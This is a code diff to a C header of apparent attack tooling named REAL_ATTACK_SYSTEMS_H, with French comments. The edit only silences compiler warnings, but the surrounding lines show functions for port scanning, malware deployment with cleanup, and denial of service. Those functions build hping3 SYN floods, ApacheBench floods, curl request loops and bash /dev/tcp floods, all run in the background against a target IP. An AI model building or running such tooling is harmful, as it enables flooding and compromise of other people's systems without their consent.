@@ -6,6 +6,9 @@
 #ifndef REAL_ATTACK_SYSTEMS_H
 #define REAL_ATTACK_SYSTEMS_H
 
+// Désactiver l'avertissement pour unused return values de system()
+#pragma GCC diagnostic ignored "-Wunused-result"
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -41,7 +44,7 @@ int real_scan_attack(const char* target_ip, const char* output_file) {
                  target_ip, output_file);
         
         printf("[*] Exécution: nmap -sV -sC -p- %s\n", target_ip);
-        system(cmd);
+        (void)system(cmd);
         
         sleep(2);  // Laisser nmap démarrer
         printf("[+] Nmap lancé en arrière-plan\n");
@@ -250,7 +253,7 @@ int real_malware_deployment(const char* target_ip, const char* malware_type) {
     // Cleanup
     char cleanup_cmd[512];
     snprintf(cleanup_cmd, sizeof(cleanup_cmd), "rm -rf %s 2>/dev/null", payload_dir);
-    system(cleanup_cmd);
+    (void)system(cleanup_cmd);
     
     return 1;
 }
@@ -281,7 +284,7 @@ int real_dos_attack(const char* target_ip, int port, int duration) {
                  "ab -n %d -c 50 -t %d http://%s:%d/ > /dev/null 2>&1 &",
                  duration * 100, duration, target_ip, port);
         
-        system(cmd);
+        (void)system(cmd);
         success = 1;
     }
     
@@ -294,7 +297,7 @@ int real_dos_attack(const char* target_ip, int port, int duration) {
                  "sudo hping3 -S -p %d --flood %s > /dev/null 2>&1 &",
                  port, target_ip);
         
-        system(cmd);
+        (void)system(cmd);
         success = 1;
     }
     
@@ -307,7 +310,7 @@ int real_dos_attack(const char* target_ip, int port, int duration) {
             snprintf(cmd, sizeof(cmd),
                      "curl -s -m 1 http://%s:%d/ > /dev/null 2>&1 &",
                      target_ip, port);
-            system(cmd);
+            (void)system(cmd);
             printf("    [%d/10] Requête envoyée\n", i+1);
         }
         
@@ -322,7 +325,7 @@ int real_dos_attack(const char* target_ip, int port, int duration) {
                  "for i in {1..100}; do timeout 1 bash -c 'echo GET / HTTP/1.1\\r\\nHost: %s\\r\\n\\r\\n > /dev/tcp/%s/%d' 2>/dev/null & done",
                  target_ip, target_ip, port);
         
-        system(cmd);
+        (void)system(cmd);
         success = 1;
     }
     
